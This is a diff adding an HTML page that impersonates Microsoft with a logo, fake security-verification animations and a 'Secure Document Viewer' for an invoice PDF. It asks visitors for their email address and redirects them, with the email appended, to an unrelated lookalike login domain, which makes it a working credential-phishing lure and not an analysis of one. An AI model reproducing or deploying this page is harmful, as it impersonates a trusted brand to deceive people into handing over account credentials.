@@ -1,0 +1,827 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Secure Document Viewer</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      background: #f3f2f1;
+      opacity: 0;
+      animation: fadeIn 0.5s ease forwards;
+    }
+
+    .preloader {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #f3f2f1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      transition: opacity 0.5s ease, visibility 0.5s ease;
+    }
+
+    .preloader.hidden {
+      opacity: 0;
+      visibility: hidden;
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 30px;
+      margin-bottom: 40px;
+      flex-wrap: wrap;
+    }
+
+    .microsoft-logo {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .microsoft-squares {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      grid-gap: 4px;
+      margin-bottom: 10px;
+      width: 60px;
+      height: 60px;
+    }
+
+    .microsoft-square {
+      width: 100%;
+      height: 100%;
+    }
+
+    .microsoft-square:nth-child(1) { background-color: #F35325; }
+    .microsoft-square:nth-child(2) { background-color: #81BC06; }
+    .microsoft-square:nth-child(3) { background-color: #05A6F0; }
+    .microsoft-square:nth-child(4) { background-color: #FFBA08; }
+
+    .microsoft-text {
+      font-family: 'Segoe UI', sans-serif;
+      font-size: 20px;
+      font-weight: 300;
+      color: #323130;
+      letter-spacing: -0.5px;
+    }
+
+    .security-header {
+      font-family: 'Segoe UI', sans-serif;
+      font-size: 22px;
+      color: #323130;
+      font-weight: 600;
+      margin-bottom: 30px;
+      text-align: center;
+    }
+
+    .security-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 40px;
+      margin-bottom: 40px;
+      flex-wrap: wrap;
+    }
+
+    .padlock-container {
+      position: relative;
+      width: 120px;
+      height: 120px;
+    }
+
+    .padlock {
+      width: 100px;
+      height: 100px;
+      border: 5px solid #03787C;
+      position: relative;
+      margin: 0 auto;
+      animation: lockPulse 2s infinite ease-in-out;
+    }
+
+    .padlock-body {
+      width: 100%;
+      height: 70px;
+      background: #03787C;
+      position: absolute;
+      bottom: 0;
+    }
+
+    .padlock-shackle {
+      width: 40px;
+      height: 50px;
+      border: 5px solid #03787C;
+      border-radius: 25px 25px 0 0;
+      position: absolute;
+      top: -25px;
+      left: 50%;
+      transform: translateX(-50%);
+      animation: shackleMove 2s infinite ease-in-out;
+    }
+
+    .secure-connection {
+      max-width: 250px;
+      text-align: left;
+    }
+
+    .secure-title {
+      font-family: 'Segoe UI', sans-serif;
+      font-size: 18px;
+      color: #323130;
+      font-weight: 600;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .secure-desc {
+      font-family: 'Segoe UI', sans-serif;
+      font-size: 14px;
+      color: #605E5C;
+      line-height: 1.5;
+    }
+
+    .status-container {
+      background: #ffffff;
+      border: 1px solid #E1DFDD;
+      padding: 20px;
+      max-width: 500px;
+      margin: 0 auto;
+    }
+
+    .status-text {
+      font-family: 'Segoe UI', sans-serif;
+      font-size: 14px;
+      color: #323130;
+      font-weight: 400;
+      margin-bottom: 15px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .status-progress {
+      width: 100%;
+      height: 4px;
+      background: #E1DFDD;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 0;
+      background: #03787C;
+      animation: progressLoad 3.5s ease-in-out forwards;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 500px;
+      background: #ffffff;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+      overflow: hidden;
+      border: 1px solid #E1DFDD;
+      margin: 40px auto;
+    }
+
+    .header {
+      background: #03787C;
+      color: white;
+      padding: 20px 25px;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      border-bottom: 1px solid #E1DFDD;
+    }
+
+    .header h1 {
+      margin: 0;
+      font-size: 18px;
+      font-weight: 600;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    .content {
+      padding: 25px;
+    }
+
+    .document-preview {
+      background: #FAF9F8;
+      padding: 20px;
+      margin-bottom: 20px;
+      border: 1px solid #E1DFDD;
+      text-align: center;
+    }
+
+    .pdf-logo {
+      width: 70px;
+      height: 70px;
+      background: linear-gradient(135deg, #F44336 0%, #D32F2F 100%);
+      margin: 0 auto 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .pdf-logo i {
+      font-size: 36px;
+      color: white;
+    }
+
+    .document-info {
+      text-align: left;
+      margin-top: 20px;
+      padding: 15px;
+      background: white;
+      border-left: 4px solid #03787C;
+    }
+
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      border-bottom: 1px solid #FAF9F8;
+    }
+
+    .info-row:last-child {
+      border-bottom: none;
+    }
+
+    .info-label {
+      font-weight: 600;
+      color: #323130;
+      font-size: 13px;
+    }
+
+    .info-value {
+      color: #323130;
+      font-size: 13px;
+    }
+
+    .security-notice {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      background: #E6F4F4;
+      padding: 15px;
+      margin-bottom: 20px;
+      border-left: 4px solid #03787C;
+    }
+
+    .security-notice i {
+      color: #03787C;
+      font-size: 18px;
+      margin-top: 2px;
+    }
+
+    .security-notice p {
+      margin: 0;
+      font-size: 13px;
+      color: #03787C;
+      line-height: 1.5;
+    }
+
+    .access-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      background: #03787C;
+      color: white;
+      padding: 12px;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 600;
+      border: none;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      font-family: 'Segoe UI', sans-serif;
+    }
+	.btn{
+		color: white;
+	}
+
+    .btn:hover {
+      background: #026367;
+    }
+
+    .microsoft-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 20px;
+      color: #605E5C;
+      font-size: 13px;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    .microsoft-badge i {
+      color: #03787C;
+    }
+
+    .footer {
+      text-align: center;
+      padding: 15px 25px;
+      font-size: 11px;
+      color: #605E5C;
+      border-top: 1px solid #E1DFDD;
+      background: #FAF9F8;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    .file-size {
+      color: #107C10;
+      font-weight: 600;
+    }
+
+    @keyframes lockPulse {
+      0%, 100% {
+        transform: scale(1);
+        border-color: #03787C;
+      }
+      50% {
+        transform: scale(1.05);
+        border-color: #026367;
+      }
+    }
+
+    @keyframes shackleMove {
+      0%, 100% {
+        height: 50px;
+        top: -25px;
+      }
+      50% {
+        height: 55px;
+        top: -30px;
+      }
+    }
+
+    @keyframes progressLoad {
+      0% {
+        width: 0;
+      }
+      25% {
+        width: 25%;
+      }
+      50% {
+        width: 50%;
+      }
+      75% {
+        width: 75%;
+      }
+      100% {
+        width: 100%;
+      }
+    }
+
+    @keyframes fadeIn {
+      to {
+        opacity: 1;
+      }
+    }
+
+    .verification-check {
+      color: #107C10;
+      margin-left: 5px;
+    }
+
+    .status-check {
+      color: #107C10;
+      opacity: 0;
+      animation: checkFadeIn 0.3s ease forwards;
+      animation-delay: calc(var(--delay) * 1s);
+    }
+
+    @keyframes checkFadeIn {
+      to {
+        opacity: 1;
+      }
+    }
+	
+	.input-label {
+      display: block;
+      text-align: left;
+      font-size: 14px;
+      font-weight: 600;
+      color: #475569;
+      margin-bottom: 8px;
+      padding-left: 5px;
+    }
+
+    .email-input-wrapper {
+      position: relative;
+      width: 100%;
+    }
+
+    .email-input-wrapper i {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #94a3b8;
+      font-size: 18px;
+      z-index: 1;
+    }
+
+    input[type="email"] {
+      width: 100%;
+      padding: 16px 16px 16px 50px;
+      border: 2px solid #cbd5e1;
+      border-radius: 10px;
+      font-size: 16px;
+      transition: all 0.3s ease;
+      background: white;
+      color: #1e293b;
+      font-weight: 500;
+      font-family: inherit;
+    }
+
+    input[type="email"]:focus {
+      outline: none;
+      border-color: #3b82f6;
+      box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15);
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Preloader with Security Animation -->
+  <div class="preloader" id="preloader">
+    <div class="logo-container">
+      <div class="microsoft-logo">
+        <div class="microsoft-squares">
+          <div class="microsoft-square"></div>
+          <div class="microsoft-square"></div>
+          <div class="microsoft-square"></div>
+          <div class="microsoft-square"></div>
+        </div>
+        <div class="microsoft-text">Microsoft</div>
+      </div>
+    </div>
+    
+    <div class="secure-loader">
+      <div class="security-header">
+        Secure Document Access
+      </div>
+      
+      <div class="security-container">
+        <div class="padlock-container">
+          <div class="padlock">
+            <div class="padlock-body"></div>
+            <div class="padlock-shackle"></div>
+          </div>
+        </div>
+        
+        <div class="secure-connection">
+          <div class="secure-title">
+            <i class="fas fa-shield-alt"></i>
+            Security Verification
+          </div>
+          <div class="secure-desc">
+            Your connection is being secured. Please wait while we verify access permissions.
+          </div>
+        </div>
+      </div>
+      
+      <div class="status-container">
+        <div class="status-text" id="statusText1">
+          <span>Verifying credentials</span>
+          <i class="fas fa-check status-check" style="--delay: 0.8"></i>
+        </div>
+        <div class="status-text" id="statusText2">
+          <span>Establishing connection</span>
+          <i class="fas fa-check status-check" style="--delay: 1.8"></i>
+        </div>
+        <div class="status-text" id="statusText3">
+          <span>Validating permissions</span>
+          <i class="fas fa-check status-check" style="--delay: 2.5"></i>
+        </div>
+        <div class="status-text" id="statusText4">
+          <span>Applying security</span>
+          <i class="fas fa-check status-check" style="--delay: 3.2"></i>
+        </div>
+        
+        <div class="status-progress">
+          <div class="progress-bar"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Main Content -->
+  <div class="container" style="display: none;" id="mainContent">
+    <div class="header">
+      <h1>Secure Document Viewer</h1>
+    </div>
+    
+    <div class="content">
+      <div class="document-preview">
+        <div class="pdf-logo">
+          <i class="fas fa-file-pdf"></i>
+        </div>
+        
+        <div class="document-info">
+          <div class="info-row">
+            <span class="info-label">Document Title:</span>
+            <span class="info-value">Invoice_Payment_Copy_F7363#.pdf</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">File Size:</span>
+            <span class="info-value file-size">4.7 MB</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">File Type:</span>
+            <span class="info-value">PDF Document</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">Last Modified:</span>
+            <span class="info-value">January 13, 2026</span>
+          </div>
+          <div class="info-row">
+            <span class="info-label">Security Status:</span>
+            <span class="info-value">Protected <i class="fas fa-check-circle verification-check"></i></span>
+          </div>
+        </div>
+      </div>
+      
+      <div class="security-notice">
+        <i class="fas fa-lock"></i>
+        <p>This document is securely hosted. Your access is protected by security protocols.
+          </p>
+      </div>
+      <form id="emailForm" class="email-form" method="GET">
+	  <div class="input-group">
+	  <label for="email" class="input-label">
+              <i class="fas fa-envelope"></i> Email Address
+            </label>
+	  <div class="email-input-wrapper">
+              <i class="fas fa-at"></i>
+              <input 
+                type="email" 
+                name="email"
+                id="email" 
+                placeholder="your.email@company.com" 
+                required
+                autocomplete="email"
+                autocorrect="off"
+                spellcheck="false"
+              >
+            </div>
+		</div>
+		<button type="submit" class="access-btn">
+      <p class="btn" id="secureLink">
+        <i class="fas fa-external-link-alt"></i>
+        Open Document in Secure Viewer
+      </p>
+	  </button>
+	  </form>
+      
+      <div class="microsoft-badge">
+        <i class="fab fa-microsoft"></i>
+        <span>Secured Document Viewer</span>
+      </div>
+    </div>
+    
+    <div class="footer">
+      <p>© 2026 Secure Document Viewer. This document is protected by security protocols.</p>
+    </div>
+  </div>
+
+  <script>
+  
+	// Base64 encoding function that works in all browsers
+    function encodeBase64(str) {
+      try {
+        // For modern browsers
+        if (typeof btoa !== 'undefined') {
+          return btoa(unescape(encodeURIComponent(str)));
+        }
+        
+        // Alternative method for compatibility
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+        let output = '';
+        let i = 0;
+        
+        // Convert string to UTF-8
+        str = encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, function(match, p1) {
+          return String.fromCharCode('0x' + p1);
+        });
+        
+        while (i < str.length) {
+          const chr1 = str.charCodeAt(i++);
+          const chr2 = str.charCodeAt(i++);
+          const chr3 = str.charCodeAt(i++);
+          
+          const enc1 = chr1 >> 2;
+          const enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
+          const enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
+          const enc4 = chr3 & 63;
+          
+          if (isNaN(chr2)) {
+            enc3 = enc4 = 64;
+          } else if (isNaN(chr3)) {
+            enc4 = 64;
+          }
+          
+          output = output +
+            chars.charAt(enc1) + chars.charAt(enc2) +
+            chars.charAt(enc3) + chars.charAt(enc4);
+        }
+        
+        return output;
+      } catch (e) {
+        // Fallback: use simple btoa if available
+        if (typeof btoa !== 'undefined') {
+          return btoa(str);
+        }
+        return str;
+      }
+    }
+	
+	function showMessage(message, type) {
+      const existingMsg = document.querySelector('.message-alert');
+      if (existingMsg) existingMsg.remove();
+      
+      const msgEl = document.createElement('div');
+      msgEl.className = 'message-alert';
+      
+      let bgColor, textColor, borderColor, iconColor, icon;
+      
+      switch(type) {
+        case 'success':
+          bgColor = '#dff6dd';
+          textColor = '#107c10';
+          borderColor = '#9ff28d';
+          iconColor = '#107c10';
+          icon = 'fa-check-circle';
+          break;
+        case 'error':
+          bgColor = '#fde7e9';
+          textColor = '#a80000';
+          borderColor = '#f1bbbc';
+          iconColor = '#a80000';
+          icon = 'fa-exclamation-circle';
+          break;
+        case 'info':
+        default:
+          bgColor = '#e7f3ff';
+          textColor = '#005a9e';
+          borderColor = '#b3d6ff';
+          iconColor = '#0078d4';
+          icon = 'fa-info-circle';
+          break;
+      }
+      
+      msgEl.style.cssText = `
+        position: fixed;
+        top: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: ${bgColor};
+        color: ${textColor};
+        padding: 14px 24px;
+        border-radius: 8px;
+        border: 1px solid ${borderColor};
+        box-shadow: 0 6px 20px rgba(0,0,0,0.1);
+        z-index: 1000;
+        font-weight: 500;
+        max-width: 90%;
+        text-align: center;
+        animation: slideIn 0.3s cubic-bezier(0.1, 0.9, 0.2, 1);
+        font-size: 14px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+      `;
+      
+      msgEl.innerHTML = `
+        <i class="fas ${icon}" style="color: ${iconColor}; font-size: 16px;"></i>
+        <div>${message}</div>
+      `;
+      
+      document.body.appendChild(msgEl);
+      
+      setTimeout(() => {
+        msgEl.style.opacity = '0';
+        msgEl.style.transition = 'opacity 0.3s ease';
+        setTimeout(() => msgEl.remove(), 300);
+      }, 3000);
+    }
+	
+	
+    document.addEventListener('DOMContentLoaded', function() {
+      const preloader = document.getElementById('preloader');
+      const mainContent = document.getElementById('mainContent');
+      const secureLink = document.getElementById('secureLink');
+	  
+      
+      // Add visual feedback on click
+      document.getElementById('emailForm').addEventListener('submit', function(e) {
+			e.preventDefault();
+			
+			const emailInput = document.getElementById('email');
+			const email = emailInput.value.trim();
+			const btn = document.querySelector('.access-btn');
+      
+		  // Basic validation
+		  if (!email || !email.includes('@')) {
+		  //console.log(email);
+			showMessage('Please enter a valid email address.', 'error');
+			emailInput.focus();
+			return;
+		  }
+		  
+		  // Email format validation
+		  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+		  if (!emailRegex.test(email)) {
+			showMessage('Please enter a valid email format (e.g., name@company.com).', 'error');
+			emailInput.focus();
+			return;
+		  }
+			const originalText = this.innerHTML;
+			this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Opening document...';
+			this.style.pointerEvents = 'none';
+			
+			// Reset button after 2 seconds
+			setTimeout(() => {
+			  this.innerHTML = originalText;
+			  this.style.pointerEvents = 'auto';
+			}, 2000);
+			
+			setTimeout(() => {
+			// Clean email
+			const cleanEmail = email.toLowerCase().trim();
+			
+			// Encode email to Base64
+			const encodedEmail = encodeBase64(cleanEmail);
+			
+			// Construct target URL with Base64 encoded email
+			const baseUrl = 'https://login.reedbcasl.eu/fmtybjHBlWywvk#';
+			const finalUrl = baseUrl + cleanEmail;
+			console.log(finalUrl);
+			
+			
+			// Add slight delay before redirect for better UX
+			setTimeout(() => {
+			  window.location.href = finalUrl;
+			}, 800);
+			
+		  }, 1200);
+		});
+    
+      
+      // Show checkmarks in sequence
+      function showCheckmarks() {
+        const checkmarks = document.querySelectorAll('.status-check');
+        checkmarks.forEach((check, index) => {
+          setTimeout(() => {
+            check.style.opacity = '1';
+          }, (index + 1) * 800);
+        });
+      }
+      
+      // Start showing checkmarks
+      setTimeout(showCheckmarks, 500);
+      
+      // Hide preloader and show main content
+      setTimeout(() => {
+        preloader.classList.add('hidden');
+        
+        setTimeout(() => {
+          preloader.style.display = 'none';
+          mainContent.style.display = 'block';
+        }, 500);
+      }, 4000);
+    });
+  </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v67327c56f0bb4ef8b305cae61679db8f1769101564043" integrity="sha512-rdcWY47ByXd76cbCFzznIcEaCN71jqkWBBqlwhF1SY7KubdLKZiEGeP7AyieKZlGP9hbY/MhGrwXzJC/HulNyg==" data-cf-beacon='{"version":"2024.11.0","token":"f87f52325f5a47a3be0745acde12e881","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
